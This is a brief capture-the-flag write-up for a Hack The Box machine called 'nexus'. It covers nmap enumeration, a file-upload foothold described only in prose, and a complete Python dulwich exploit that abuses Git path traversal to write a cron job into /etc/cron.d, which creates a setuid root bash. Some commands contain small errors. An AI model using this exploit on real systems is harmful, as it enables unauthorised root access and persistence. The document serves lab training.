## Writeup nexsus HTB;
+ scan web whit nmap results.

```bash
        + nmap -p- -sS --min-rate 5000 -vvv -n -Pn 10.129.117.18 -oG portscan
        + nmap -sCV -p80.22 10.129.117.18 -oN target
```
+ after this scan results is
>PORT   STATE SERVICE VERSION
>22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
>| ssh-hostkey: 
>|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
>|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
>80/tcp open  http    nginx 1.24.0 (Ubuntu)
>|_http-title: Did not follow redirect to http://nexus.htb/
>|_http-server-header: nginx/1.24.0 (Ubuntu)
>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

# exploitation;
After extensive scanning and enumeration, I managed to obtain the credentials for billing.nexus.htb.
Testing the platform revealed an arbitrary file upload vulnerability,
as the application only implemented basic file extension filtering on email uploads.
By uploading a reverse shell, I successfully gained initial access as the www-data user.

#privilege escalation
After performing a system scan, I discovered a Git-based path traversal vulnerability.
I developed a Python exploit to leverage this flaw and successfully obtained root access.

```bash
        mkdir repo
        
        cd !$
        
        python3 -m venv venv/
        
        python3 source/bin/activate
        
        pip3 install dulwich
        
        vi force-index.py       
        
        python3 force-index.py
```
#script in python;

```text
+ #!/usr/bin/enc python3 

+ import os
+ from dulwich.repo import Repo
+ from dulwich.objects import Blob, Tree, Commit

+ # Inizializza la repository nella cartella corrente
r = Repo(".")

+ # 1. Crea e aggiungi il Blob
+ b = Blob()
+ b.data = b"* * * * * root cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash\n"
+ r.object_store.add_object(b)  # Questo assegna anche l'hash SHA-1 a b.id

+ # 2. Crea e aggiungi l'albero (Tree)
t = Tree()
+ # Il nome del file deve essere in byte
+ t.add(b"../../../../../etc/cron.d/unauth_persistence", 0o100644, b.id)
+ r.object_store.add_object(t)

+ # 3. Crea e aggiungi il Commit
+ c = Commit()
+ c.tree = t.id
+ c.author = c.committer = b"jones <j.matthew@nexus.htb>"
+ c.commit_time = c.author_time = 1234567890
+ c.commit_timezone = c.author_timezone = 0
+ c.message = b"Exploit Path Traversal"
+ r.object_store.add_object(c)

+ # 4. Aggiorna il riferimento del branch master
+ r.refs[b"refs/heads/master"] = c.id
+ print("Poc Git repository successfully built!")

```
```bash
        ls -l /tmp/
        
        /tmp/rootbash -p 
        
        whoami
        root
```
